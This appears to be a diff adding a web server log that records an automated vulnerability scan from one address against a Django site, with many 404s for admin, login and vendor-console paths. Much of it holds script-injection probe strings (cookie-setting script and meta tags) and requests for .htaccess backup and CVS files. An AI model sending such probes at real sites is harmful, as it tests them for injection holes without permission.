+[08/Oct/2023 04:46:53,774] - Broken pipe from ('130.253.1.147', 37506)
+
+[08/Oct/2023 04:46:53,775] - Broken pipe from ('130.253.1.147', 37580)
+
+Not Found: /cQmn6HkI.rem
+[08/Oct/2023 04:46:53] "GET /cQmn6HkI.rem HTTP/1.1" 404 5319
+[08/Oct/2023 04:46:53] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:46:53,967] - Broken pipe from ('130.253.1.147', 37582)
+
+[08/Oct/2023 04:46:54] "GET / HTTP/1.1" 200 35341
+Not Found: /xwHFKRuW.soap
+[08/Oct/2023 04:46:54] "GET /xwHFKRuW.soap HTTP/1.1" 404 5322
+[08/Oct/2023 04:46:54] "GET / HTTP/1.1" 200 35341
+Not Found: /devinfo.xml
+[08/Oct/2023 04:46:54] "GET /devinfo.xml HTTP/1.1" 404 5316
+[08/Oct/2023 04:46:54,382] - Broken pipe from ('130.253.1.147', 37640)
+
+Not Found: /js/webcfg.js
+[08/Oct/2023 04:46:54] "GET /js/webcfg.js HTTP/1.1" 404 5319
+[08/Oct/2023 04:46:54,464] - Broken pipe from ('130.253.1.147', 37502)
+
+[08/Oct/2023 04:46:54] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:46:54] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:46:54,582] - Broken pipe from ('130.253.1.147', 37680)
+
+[08/Oct/2023 04:46:54] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:46:54] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:46:54] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:46:54] "GET / HTTP/1.1" 200 35341
+Not Found: /ddf6gUVC.aspx
+[08/Oct/2023 04:46:55] "GET /ddf6gUVC.aspx HTTP/1.1" 404 5322
+Not Found: /api
+[08/Oct/2023 04:46:55] "GET /api HTTP/1.1" 404 5292
+Not Found: /*
+[08/Oct/2023 04:46:55] "OPTIONS * HTTP/1.1" 404 1763
+[08/Oct/2023 04:46:55,893] - Broken pipe from ('130.253.1.147', 37784)
+
+[08/Oct/2023 04:46:55,945] - Broken pipe from ('130.253.1.147', 37706)
+
+[08/Oct/2023 04:46:55,948] - Broken pipe from ('130.253.1.147', 37754)
+
+[08/Oct/2023 04:46:56] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:46:56] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:46:56] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:46:56] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:46:56,211] - Broken pipe from ('130.253.1.147', 37756)
+
+Not Found: /servlet/UDataArea
+[08/Oct/2023 04:46:56] "GET /servlet/UDataArea?plugin=com.dell.oma.webplugins.AboutWebPlugin HTTP/1.1" 404 5380
+Not Found: /common/about.php
+Not Found: /about
+[08/Oct/2023 04:46:56] "GET /common/about.php HTTP/1.1" 404 5331
+[08/Oct/2023 04:46:56] "GET /about HTTP/1.1" 404 5298
+[08/Oct/2023 04:46:56] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:46:56,313] - Broken pipe from ('130.253.1.147', 38048)
+
+[08/Oct/2023 04:46:56,314] - Broken pipe from ('130.253.1.147', 38044)
+
+[08/Oct/2023 04:46:56] "GET / HTTP/1.1" 200 35341
+Not Found: /UDataArea
+[08/Oct/2023 04:46:56] "GET /UDataArea?plugin=com.dell.oma.webplugins.AboutWebPlugin HTTP/1.1" 404 5356
+Not Found: /CVS/Entries
+[08/Oct/2023 04:46:56] "GET /CVS/Entries HTTP/1.1" 404 5310
+[08/Oct/2023 04:46:56,639] - Broken pipe from ('130.253.1.147', 38014)
+
+Not Found: /test.js
+[08/Oct/2023 04:46:56] "GET /test.js HTTP/1.1" 404 5304
+[08/Oct/2023 04:46:56] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:46:56] "GET / HTTP/1.1" 200 35341
+Not Found: /management/login
+[08/Oct/2023 04:46:56] "GET /management/login HTTP/1.1" 404 5331
+[08/Oct/2023 04:46:56,788] - Broken pipe from ('130.253.1.147', 38104)
+
+[08/Oct/2023 04:46:56,971] - Broken pipe from ('130.253.1.147', 38116)
+
+Not Found: /crossdomain.xml
+[08/Oct/2023 04:46:56] "GET /crossdomain.xml HTTP/1.1" 404 5328
+[08/Oct/2023 04:46:56] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:46:57] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:46:57] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:46:57,201] - Broken pipe from ('130.253.1.147', 38194)
+
+[08/Oct/2023 04:46:57] "GET / HTTP/1.1" 200 35341
+Not Found: /rest-service/reviews-v1/versionInfo
+[08/Oct/2023 04:46:57] "GET /rest-service/reviews-v1/versionInfo HTTP/1.1" 404 5388
+[08/Oct/2023 04:46:58,202] - Broken pipe from ('130.253.1.147', 38182)
+
+Not Found: /dvrt9z7e.asp
+[08/Oct/2023 04:46:58] "GET /dvrt9z7e.asp?<script>document.cookie=%22testesuu=1644;%22</script> HTTP/1.1" 404 5381
+Not Found: /api/login/
+[08/Oct/2023 04:46:58] "POST /api/login/ HTTP/1.1" 404 5314
+Not Found: /ConsoleHelp/default.jsp
+[08/Oct/2023 04:46:58] "GET /ConsoleHelp/default.jsp HTTP/1.1" 404 5346
+Not Found: /cld/
+[08/Oct/2023 04:46:58] "GET /cld/ HTTP/1.1" 404 5295
+[08/Oct/2023 04:46:58,753] - Broken pipe from ('130.253.1.147', 38268)
+
+[08/Oct/2023 04:46:58,890] - Broken pipe from ('130.253.1.147', 38304)
+
+Not Found: /dvrt9z7e.asp
+[08/Oct/2023 04:46:58] "GET /dvrt9z7e.asp?<meta%20http-equiv=Set-Cookie%20content=%22testesuu=1644%22> HTTP/1.1" 404 5384
+[08/Oct/2023 04:46:58] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:46:59] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:46:59] "GET / HTTP/1.1" 200 35341
+Not Found: /dvrt9z7e.aspx
+[08/Oct/2023 04:46:59] "GET /dvrt9z7e.aspx?<script>document.cookie=%22testesuu=1644;%22</script> HTTP/1.1" 404 5384
+Not Found: /CFIDE/administrator/settings/version.cfm
+[08/Oct/2023 04:46:59] "GET /CFIDE/administrator/settings/version.cfm HTTP/1.1" 404 5403
+Not Found: /cmf/login
+[08/Oct/2023 04:47:00] "GET /cmf/login HTTP/1.1" 404 5310
+[08/Oct/2023 04:47:00] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:47:00,288] - Broken pipe from ('130.253.1.147', 38520)
+
+Not Found: /dvrt9z7e.aspx
+[08/Oct/2023 04:47:00] "GET /dvrt9z7e.aspx?<meta%20http-equiv=Set-Cookie%20content=%22testesuu=1644%22> HTTP/1.1" 404 5387
+[08/Oct/2023 04:47:00] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:47:00,640] - Broken pipe from ('130.253.1.147', 38590)
+
+[08/Oct/2023 04:47:00,898] - Broken pipe from ('130.253.1.147', 38598)
+
+[08/Oct/2023 04:47:00] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:47:01] "GET / HTTP/1.1" 200 35341
+Not Found: /dvrt9z7e.pl
+[08/Oct/2023 04:47:01] "GET /dvrt9z7e.pl?<script>document.cookie=%22testesuu=1644;%22</script> HTTP/1.1" 404 5378
+Not Found: /clientaccesspolicy.xml
+[08/Oct/2023 04:47:01] "GET /clientaccesspolicy.xml HTTP/1.1" 404 5349
+[08/Oct/2023 04:47:01,653] - Broken pipe from ('130.253.1.147', 38824)
+
+Not Found: /dvrt9z7e.pl
+[08/Oct/2023 04:47:01] "GET /dvrt9z7e.pl?<meta%20http-equiv=Set-Cookie%20content=%22testesuu=1644%22> HTTP/1.1" 404 5381
+[08/Oct/2023 04:47:01] "GET / HTTP/1.1" 200 35341
+Not Found: /Director
+[08/Oct/2023 04:47:01] "GET /Director HTTP/1.1" 404 5307
+[08/Oct/2023 04:47:01] "GET / HTTP/1.1" 200 35341
+Not Found: /dvrt9z7e.cgi
+[08/Oct/2023 04:47:01] "GET /dvrt9z7e.cgi?<script>document.cookie=%22testesuu=1644;%22</script> HTTP/1.1" 404 5381
+Not Found: /DesktopDirector
+[08/Oct/2023 04:47:01] "GET /DesktopDirector HTTP/1.1" 404 5328
+[08/Oct/2023 04:47:01,983] - Broken pipe from ('130.253.1.147', 38872)
+
+[08/Oct/2023 04:47:02,187] - Broken pipe from ('130.253.1.147', 38914)
+
+[08/Oct/2023 04:47:02] "GET / HTTP/1.1" 200 35341
+Not Found: /dvrt9z7e.cgi
+[08/Oct/2023 04:47:02] "GET /dvrt9z7e.cgi?<meta%20http-equiv=Set-Cookie%20content=%22testesuu=1644%22> HTTP/1.1" 404 5384
+[08/Oct/2023 04:47:02] "GET / HTTP/1.1" 200 35341
+Not Found: /login
+[08/Oct/2023 04:47:02] "GET /login HTTP/1.1" 404 5298
+[08/Oct/2023 04:47:02,439] - Broken pipe from ('130.253.1.147', 39084)
+
+[08/Oct/2023 04:47:02] "GET / HTTP/1.1" 200 35341
+Not Found: /vpn/
+[08/Oct/2023 04:47:02] "GET /vpn/ HTTP/1.1" 404 5295
+Not Found: /dvrt9z7e.exe
+[08/Oct/2023 04:47:02] "GET /dvrt9z7e.exe?<script>document.cookie=%22testesuu=1644;%22</script> HTTP/1.1" 404 5381
+Not Found: /client/
+[08/Oct/2023 04:47:02] "GET /client/ HTTP/1.1" 404 5304
+[08/Oct/2023 04:47:02,636] - Broken pipe from ('130.253.1.147', 39182)
+
+[08/Oct/2023 04:47:02] "GET / HTTP/1.1" 200 35341
+Not Found: /dvrt9z7e.exe
+[08/Oct/2023 04:47:02] "GET /dvrt9z7e.exe?<meta%20http-equiv=Set-Cookie%20content=%22testesuu=1644%22> HTTP/1.1" 404 5384
+Not Found: /login
+[08/Oct/2023 04:47:02] "GET /login?redirects=10 HTTP/1.1" 404 5311
+[08/Oct/2023 04:47:02,743] - Broken pipe from ('130.253.1.147', 39214)
+
+[08/Oct/2023 04:47:02,927] - Broken pipe from ('130.253.1.147', 39270)
+
+Not Found: /ControllerWeb/
+[08/Oct/2023 04:47:02] "GET /ControllerWeb/ HTTP/1.1" 404 5325
+[08/Oct/2023 04:47:02] "GET / HTTP/1.1" 200 35341
+Not Found: /dvrt9z7e.cfm
+[08/Oct/2023 04:47:03] "GET /dvrt9z7e.cfm?<script>document.cookie=%22testesuu=1644;%22</script> HTTP/1.1" 404 5381
+[08/Oct/2023 04:47:03] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:47:03,470] - Broken pipe from ('130.253.1.147', 39334)
+
+[08/Oct/2023 04:47:03] "GET / HTTP/1.1" 200 35341
+Not Found: /app/ui/login.jsp
+[08/Oct/2023 04:47:03] "GET /app/ui/login.jsp HTTP/1.1" 404 5331
+Not Found: /ui/faces/Login.xhtml
+Not Found: /dvrt9z7e.cfm
+[08/Oct/2023 04:47:03] "GET /ui/faces/Login.xhtml HTTP/1.1" 404 5343
+[08/Oct/2023 04:47:03] "GET /dvrt9z7e.cfm?<meta%20http-equiv=Set-Cookie%20content=%22testesuu=1644%22> HTTP/1.1" 404 5384
+[08/Oct/2023 04:47:03,665] - Broken pipe from ('130.253.1.147', 39394)
+
+Not Found: /index.html
+[08/Oct/2023 04:47:03] "GET /index.html HTTP/1.1" 404 5313
+[08/Oct/2023 04:47:03,749] - Broken pipe from ('130.253.1.147', 39406)
+
+Not Found: /dvrt9z7e.html
+[08/Oct/2023 04:47:03] "GET /dvrt9z7e.html?<script>document.cookie=%22testesuu=1644;%22</script> HTTP/1.1" 404 5384
+[08/Oct/2023 04:47:03] "GET / HTTP/1.1" 200 35341
+Not Found: /login
+[08/Oct/2023 04:47:03] "GET /login HTTP/1.1" 404 5298
+[08/Oct/2023 04:47:03] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:47:03,799] - Broken pipe from ('130.253.1.147', 39534)
+
+Not Found: /dvrt9z7e.html
+[08/Oct/2023 04:47:03] "GET /dvrt9z7e.html?<meta%20http-equiv=Set-Cookie%20content=%22testesuu=1644%22> HTTP/1.1" 404 5387
+Not Found: /getxml
+[08/Oct/2023 04:47:04] "GET / HTTP/1.1" 200 35341
+Not Found: /dvrt9z7e.jsp
+[08/Oct/2023 04:47:04] "GET /getxml HTTP/1.1" 404 5301
+Not Found: /system.xml
+[08/Oct/2023 04:47:04] "GET /dvrt9z7e.jsp?<script>document.cookie=%22testesuu=1644;%22</script> HTTP/1.1" 404 5381
+[08/Oct/2023 04:47:04] "GET /system.xml HTTP/1.1" 404 5313
+[08/Oct/2023 04:47:04,146] - Broken pipe from ('130.253.1.147', 39592)
+
+[08/Oct/2023 04:47:04,147] - Broken pipe from ('130.253.1.147', 39604)
+
+[08/Oct/2023 04:47:04] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:47:04] "GET / HTTP/1.1" 200 35341
+Not Found: /dvrt9z7e.jsp
+Not Found: /login
+[08/Oct/2023 04:47:04] "GET /dvrt9z7e.jsp?<meta%20http-equiv=Set-Cookie%20content=%22testesuu=1644%22> HTTP/1.1" 404 5384
+[08/Oct/2023 04:47:04] "GET /login?redirects=10 HTTP/1.1" 404 5311
+[08/Oct/2023 04:47:04,543] - Broken pipe from ('130.253.1.147', 39650)
+
+[08/Oct/2023 04:47:04] "GET / HTTP/1.1" 200 35341
+Not Found: /dvrt9z7e.php
+[08/Oct/2023 04:47:04] "GET /dvrt9z7e.php?<script>document.cookie=%22testesuu=1644;%22</script> HTTP/1.1" 404 5381
+Not Found: /cwhp/CSMSDesktop/about.jsp
+Not Found: /http:/kimlab01-vlp.du.edu:17778/authentication/login/
+[08/Oct/2023 04:47:05] "GET http://kimlab01-vlp.du.edu:17778/authentication/login/ HTTP/1.1" 404 1917
+[08/Oct/2023 04:47:05] "GET /cwhp/CSMSDesktop/about.jsp HTTP/1.1" 404 5361
+[08/Oct/2023 04:47:05,523] - Broken pipe from ('130.253.1.147', 39734)
+
+Not Found: /dvrt9z7e.php
+[08/Oct/2023 04:47:05] "GET /dvrt9z7e.php?<meta%20http-equiv=Set-Cookie%20content=%22testesuu=1644%22> HTTP/1.1" 404 5384
+Not Found: /lang_pack/EN.js
+Not Found: /CSCOnm/servlet/login/login.jsp
+[08/Oct/2023 04:47:05] "GET /CSCOnm/servlet/login/login.jsp HTTP/1.1" 404 5373
+[08/Oct/2023 04:47:05] "GET /lang_pack/EN.js HTTP/1.1" 404 5328
+[08/Oct/2023 04:47:05] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:47:06,384] - Broken pipe from ('130.253.1.147', 39736)
+
+[08/Oct/2023 04:47:06,385] - Broken pipe from ('130.253.1.147', 39832)
+
+Not Found: /dvrt9z7e.php3
+[08/Oct/2023 04:47:06] "GET /dvrt9z7e.php3?<script>document.cookie=%22testesuu=1644;%22</script> HTTP/1.1" 404 5384
+[08/Oct/2023 04:47:06] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:47:06] "GET / HTTP/1.1" 200 35341
+Not Found: /login.jsp
+[08/Oct/2023 04:47:07] "GET /login.jsp HTTP/1.1" 404 5310
+Not Found: /dvrt9z7e.php3
+[08/Oct/2023 04:47:07] "GET /dvrt9z7e.php3?<meta%20http-equiv=Set-Cookie%20content=%22testesuu=1644%22> HTTP/1.1" 404 5387
+[08/Oct/2023 04:47:07,181] - Broken pipe from ('130.253.1.147', 40064)
+
+Not Found: /CSCOnm/servlet/login/login.jsp
+[08/Oct/2023 04:47:07] "GET /CSCOnm/servlet/login/login.jsp HTTP/1.1" 404 5373
+Not Found: /login.html
+[08/Oct/2023 04:47:07] "GET /login.html HTTP/1.1" 404 5313
+[08/Oct/2023 04:47:07] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:47:07,576] - Broken pipe from ('130.253.1.147', 40222)
+
+Not Found: /dvrt9z7e.cfc
+[08/Oct/2023 04:47:07] "GET /dvrt9z7e.cfc?<script>document.cookie=%22testesuu=1644;%22</script> HTTP/1.1" 404 5381
+[08/Oct/2023 04:47:07,713] - Broken pipe from ('130.253.1.147', 40242)
+
+[08/Oct/2023 04:47:07] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:47:07] "GET / HTTP/1.1" 200 35341
+Not Found: /login
+[08/Oct/2023 04:47:07] "GET /login?redirects=10 HTTP/1.1" 404 5311
+Not Found: /dvrt9z7e.cfc
+[08/Oct/2023 04:47:08] "GET /dvrt9z7e.cfc?<meta%20http-equiv=Set-Cookie%20content=%22testesuu=1644%22> HTTP/1.1" 404 5384
+[08/Oct/2023 04:47:08] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:47:08,479] - Broken pipe from ('130.253.1.147', 40366)
+
+[08/Oct/2023 04:47:08] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:47:08] "GET /admin/public/index.html HTTP/1.1" 302 0
+[08/Oct/2023 04:47:08,852] - Broken pipe from ('130.253.1.147', 40440)
+
+Not Found: /dvrt9z7e.nsf
+[08/Oct/2023 04:47:08] "GET /dvrt9z7e.nsf?<script>document.cookie=%22testesuu=1644;%22</script> HTTP/1.1" 404 5381
+[08/Oct/2023 04:47:09] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:47:09,608] - Broken pipe from ('130.253.1.147', 40442)
+
+Not Found: /+CSCOE+/logon.html
+[08/Oct/2023 04:47:09] "GET /+CSCOE+/logon.html HTTP/1.1" 404 5337
+Not Found: /dvrt9z7e.nsf
+[08/Oct/2023 04:47:09] "GET /dvrt9z7e.nsf?<meta%20http-equiv=Set-Cookie%20content=%22testesuu=1644%22> HTTP/1.1" 404 5384
+[08/Oct/2023 04:47:09] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:47:09,989] - Broken pipe from ('130.253.1.147', 40608)
+
+Not Found: /Login.aspx
+[08/Oct/2023 04:47:10] "GET /Login.aspx HTTP/1.1" 404 5313
+Not Found: /dvrt9z7e.dll
+[08/Oct/2023 04:47:10] "GET /dvrt9z7e.dll?<script>document.cookie=%22testesuu=1644;%22</script> HTTP/1.1" 404 5381
+[08/Oct/2023 04:47:10] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:47:10] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:47:10] "GET /admin/ HTTP/1.1" 302 0
+Not Found: /dvrt9z7e.dll
+[08/Oct/2023 04:47:11] "GET /dvrt9z7e.dll?<meta%20http-equiv=Set-Cookie%20content=%22testesuu=1644%22> HTTP/1.1" 404 5384
+[08/Oct/2023 04:47:11,407] - Broken pipe from ('130.253.1.147', 40710)
+
+[08/Oct/2023 04:47:11,414] - Broken pipe from ('130.253.1.147', 40796)
+
+Not Found: /cacti
+[08/Oct/2023 04:47:11] "GET /cacti HTTP/1.1" 404 5298
+Not Found: /dvrt9z7e.fts
+[08/Oct/2023 04:47:11] "GET /dvrt9z7e.fts?<script>document.cookie=%22testesuu=1644;%22</script> HTTP/1.1" 404 5381
+[08/Oct/2023 04:47:11,529] - Broken pipe from ('130.253.1.147', 40894)
+
+Not Found: /%NETHOOD%/
+[08/Oct/2023 04:47:11] "GET /%NETHOOD%/ HTTP/1.1" 404 5311
+[08/Oct/2023 04:47:11] "GET / HTTP/1.1" 200 35341
+Not Found: /dvrt9z7e.fts
+[08/Oct/2023 04:47:11] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:47:11] "GET /dvrt9z7e.fts?<meta%20http-equiv=Set-Cookie%20content=%22testesuu=1644%22> HTTP/1.1" 404 5384
+[08/Oct/2023 04:47:11] "GET / HTTP/1.1" 200 35341
+Not Found: /dvrt9z7e.jspa
+[08/Oct/2023 04:47:11] "GET /dvrt9z7e.jspa?<script>document.cookie=%22testesuu=1644;%22</script> HTTP/1.1" 404 5384
+Not Found: /MM/
+[08/Oct/2023 04:47:12] "GET /MM/ HTTP/1.1" 404 5292
+Not Found: /login.html
+[08/Oct/2023 04:47:12] "GET /login.html HTTP/1.1" 404 5313
+[08/Oct/2023 04:47:12,091] - Broken pipe from ('130.253.1.147', 41086)
+
+Not Found: /dvrt9z7e.jspa
+[08/Oct/2023 04:47:12] "GET /dvrt9z7e.jspa?<meta%20http-equiv=Set-Cookie%20content=%22testesuu=1644%22> HTTP/1.1" 404 5387
+[08/Oct/2023 04:47:12] "GET / HTTP/1.1" 200 35341
+Not Found: /nosuchfile-428680291-1680397614.jsp
+[08/Oct/2023 04:47:12] "GET /nosuchfile-428680291-1680397614.jsp HTTP/1.1" 404 5388
+[08/Oct/2023 04:47:12,386] - Broken pipe from ('130.253.1.147', 41126)
+
+Not Found: /dvrt9z7e.kspx
+[08/Oct/2023 04:47:12] "GET /dvrt9z7e.kspx?<script>document.cookie=%22testesuu=1644;%22</script> HTTP/1.1" 404 5384
+[08/Oct/2023 04:47:12,607] - Broken pipe from ('130.253.1.147', 41136)
+
+Not Found: /self_upgrade.html
+[08/Oct/2023 04:47:13] "GET /self_upgrade.html HTTP/1.1" 404 5334
+Not Found: /dvrt9z7e.kspx
+[08/Oct/2023 04:47:13] "GET /dvrt9z7e.kspx?<meta%20http-equiv=Set-Cookie%20content=%22testesuu=1644%22> HTTP/1.1" 404 5387
+[08/Oct/2023 04:47:13,201] - Broken pipe from ('130.253.1.147', 41232)
+
+Not Found: /dvrt9z7e.mscgi
+[08/Oct/2023 04:47:13] "GET /dvrt9z7e.mscgi?<script>document.cookie=%22testesuu=1644;%22</script> HTTP/1.1" 404 5387
+Not Found: /dvrt9z7e.mscgi
+[08/Oct/2023 04:47:13] "GET /dvrt9z7e.mscgi?<meta%20http-equiv=Set-Cookie%20content=%22testesuu=1644%22> HTTP/1.1" 404 5390
+Not Found: /dvrt9z7e.do
+[08/Oct/2023 04:47:14] "GET /dvrt9z7e.do?<script>document.cookie=%22testesuu=1644;%22</script> HTTP/1.1" 404 5378
+Not Found: /dvrt9z7e.do
+[08/Oct/2023 04:47:14] "GET /dvrt9z7e.do?<meta%20http-equiv=Set-Cookie%20content=%22testesuu=1644%22> HTTP/1.1" 404 5381
+Not Found: /dvrt9z7e.htm
+[08/Oct/2023 04:47:15] "GET /dvrt9z7e.htm?<script>document.cookie=%22testesuu=1644;%22</script> HTTP/1.1" 404 5381
+Not Found: /dvrt9z7e.htm
+[08/Oct/2023 04:47:15] "GET /dvrt9z7e.htm?<meta%20http-equiv=Set-Cookie%20content=%22testesuu=1644%22> HTTP/1.1" 404 5384
+Not Found: /dvrt9z7e.idc
+[08/Oct/2023 04:47:16] "GET /dvrt9z7e.idc?<script>document.cookie=%22testesuu=1644;%22</script> HTTP/1.1" 404 5381
+Not Found: /dvrt9z7e.idc
+[08/Oct/2023 04:47:17] "GET /dvrt9z7e.idc?<meta%20http-equiv=Set-Cookie%20content=%22testesuu=1644%22> HTTP/1.1" 404 5384
+Not Found: /dvrt9z7e.x
+[08/Oct/2023 04:47:18] "GET /dvrt9z7e.x?<script>document.cookie=%22testesuu=1644;%22</script> HTTP/1.1" 404 5375
+Not Found: /dvrt9z7e.x
+[08/Oct/2023 04:47:18] "GET /dvrt9z7e.x?<meta%20http-equiv=Set-Cookie%20content=%22testesuu=1644%22> HTTP/1.1" 404 5378
+Not Found: /<script>document.cookie="testesuu=1644;"</script>
+[08/Oct/2023 04:47:19] "GET /<script>document.cookie=%22testesuu=1644;%22</script> HTTP/1.1" 404 5492
+Not Found: /<script>document.cookie="testesuu=1644;"<script>
+[08/Oct/2023 04:47:20] "GET <script>document.cookie=%22testesuu=1644;%22</script> HTTP/1.1" 404 1964
+[08/Oct/2023 04:47:20] "GET /?<script>document.cookie=%22testesuu=1644;%22</script> HTTP/1.1" 200 35341
+Not Found: /<meta http-equiv=Set-Cookie content="testesuu=1644">
+[08/Oct/2023 04:47:21] "GET /<meta%20http-equiv=Set-Cookie%20content=%22testesuu=1644%22> HTTP/1.1" 404 5489
+Not Found: /<meta http-equiv=Set-Cookie content="testesuu=1644">
+[08/Oct/2023 04:47:21] "GET <meta%20http-equiv=Set-Cookie%20content=%22testesuu=1644%22> HTTP/1.1" 404 1962
+[08/Oct/2023 04:47:21] "GET /?<meta%20http-equiv=Set-Cookie%20content=%22testesuu=1644%22> HTTP/1.1" 200 35341
+[08/Oct/2023 04:47:22,673] - Broken pipe from ('130.253.1.147', 38256)
+
+[08/Oct/2023 04:50:03] "GET / HTTP/1.1" 200 35341
+Not Found: /webapps/login/index.html
+[08/Oct/2023 04:50:03] "GET /webapps/login/index.html HTTP/1.1" 404 5355
+Not Found: /webct/about.jsp
+[08/Oct/2023 04:50:04] "GET /webct/about.jsp HTTP/1.1" 404 5328
+[08/Oct/2023 04:50:04,357] - Broken pipe from ('130.253.1.147', 50060)
+
+[08/Oct/2023 04:50:04] "GET / HTTP/1.1" 200 35341
+Not Found: /WS2020/Default.aspx
+[08/Oct/2023 04:50:05] "GET /WS2020/Default.aspx HTTP/1.1" 404 5340
+Not Found: /WS2021/Default.aspx
+[08/Oct/2023 04:50:05] "GET /WS2021/Default.aspx HTTP/1.1" 404 5340
+Not Found: /WS2022/Default.aspx
+[08/Oct/2023 04:50:06] "GET /WS2022/Default.aspx HTTP/1.1" 404 5340
+Not Found: /WS2023/Default.aspx
+[08/Oct/2023 04:50:06] "GET /WS2023/Default.aspx HTTP/1.1" 404 5340
+[08/Oct/2023 04:50:07,343] - Broken pipe from ('130.253.1.147', 50544)
+
+[08/Oct/2023 04:50:07] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:50:08] "GET / HTTP/1.1" 200 35341
+Not Found: /cgi-mod/index.cgi
+[08/Oct/2023 04:50:09] "GET /cgi-mod/index.cgi HTTP/1.1" 404 5334
+[08/Oct/2023 04:50:09,399] - Broken pipe from ('130.253.1.147', 51390)
+
+[08/Oct/2023 04:50:09] "GET / HTTP/1.1" 200 35341
+Not Found: /cgi-bin/index.cgi
+[08/Oct/2023 04:50:10] "GET /cgi-bin/index.cgi HTTP/1.1" 404 5334
+[08/Oct/2023 04:50:10,745] - Broken pipe from ('130.253.1.147', 51604)
+
+[08/Oct/2023 04:50:11] "GET / HTTP/1.1" 200 35341
+Not Found: /header.php
+[08/Oct/2023 04:50:11] "GET /header.php HTTP/1.1" 404 5313
+[08/Oct/2023 04:50:12,291] - Broken pipe from ('130.253.1.147', 51902)
+
+[08/Oct/2023 04:50:12] "GET / HTTP/1.1" 200 35341
+Not Found: /.htaccess.old
+[08/Oct/2023 04:50:13] "GET /.htaccess.old HTTP/1.1" 404 5322
+Not Found: /.htaccess.bak
+[08/Oct/2023 04:50:13] "GET /.htaccess.bak HTTP/1.1" 404 5322
+Not Found: /.htaccess~
+[08/Oct/2023 04:50:14] "GET /.htaccess~ HTTP/1.1" 404 5313
+Not Found: /.htaccess.copy
+[08/Oct/2023 04:50:14] "GET /.htaccess.copy HTTP/1.1" 404 5325
+Not Found: /.htaccess.tmp
+[08/Oct/2023 04:50:14] "GET /.htaccess.tmp HTTP/1.1" 404 5322
+Not Found: /..htaccess.swp
+[08/Oct/2023 04:50:15] "GET /..htaccess.swp HTTP/1.1" 404 5325
+Not Found: /.htaccess.1
+[08/Oct/2023 04:50:15] "GET /.htaccess.1 HTTP/1.1" 404 5316
+Not Found: /.htaccess.~1~
+[08/Oct/2023 04:50:16] "GET /.htaccess.~1~ HTTP/1.1" 404 5322
+[08/Oct/2023 04:50:16,458] - Broken pipe from ('130.253.1.147', 52250)
+
+[08/Oct/2023 04:50:16] "GET / HTTP/1.1" 200 35341
+Not Found: /login
+[08/Oct/2023 04:50:17] "GET /login HTTP/1.1" 404 5298
+[08/Oct/2023 04:50:17,290] - Broken pipe from ('130.253.1.147', 53314)
+
+[08/Oct/2023 04:50:17] "GET / HTTP/1.1" 200 35341
+Not Found: /cgi-bin/kvm.cgi
+[08/Oct/2023 04:50:17] "GET /cgi-bin/kvm.cgi?&file=login HTTP/1.1" 404 5344
+[08/Oct/2023 04:50:17,524] - Broken pipe from ('130.253.1.147', 53530)
+
+[08/Oct/2023 04:50:17] "GET / HTTP/1.1" 200 35341
+Not Found: /snmx-cgi/fxm.exe
+[08/Oct/2023 04:50:18] "GET /snmx-cgi/fxm.exe HTTP/1.1" 404 5331
+[08/Oct/2023 04:50:18,102] - Broken pipe from ('130.253.1.147', 53612)
+
+[08/Oct/2023 04:50:18] "GET / HTTP/1.1" 200 35341
+Not Found: /web/#/login
+[08/Oct/2023 04:50:19] "GET /web/#/login HTTP/1.1" 404 5318
+[08/Oct/2023 04:50:19,488] - Broken pipe from ('130.253.1.147', 53690)
+
+[08/Oct/2023 04:50:19] "GET / HTTP/1.1" 200 35341
+Not Found: /platform-ui/
+[08/Oct/2023 04:50:20] "GET /platform-ui/ HTTP/1.1" 404 5319
+[08/Oct/2023 04:50:20,712] - Broken pipe from ('130.253.1.147', 54118)
+
+[08/Oct/2023 04:50:20] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:50:21] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:50:22] "GET / HTTP/1.1" 200 35341
+Not Found: /server-info
+[08/Oct/2023 04:50:23] "GET /server-info HTTP/1.1" 404 5316
+[08/Oct/2023 04:50:23,757] - Broken pipe from ('130.253.1.147', 54382)
+
+[08/Oct/2023 04:50:23,793] - Broken pipe from ('130.253.1.147', 54798)
+
+[08/Oct/2023 04:50:23] "GET / HTTP/1.1" 200 35341
+[08/Oct/2023 04:50:24] "GET / HTTP/1.1" 200 35341
+Not Found: /index.html
+[08/Oct/2023 04:50:24] "GET /index.html HTTP/1.1" 404 5313
+[08/Oct/2023 04:50:24] "GET / HTTP/1.1" 200 35341
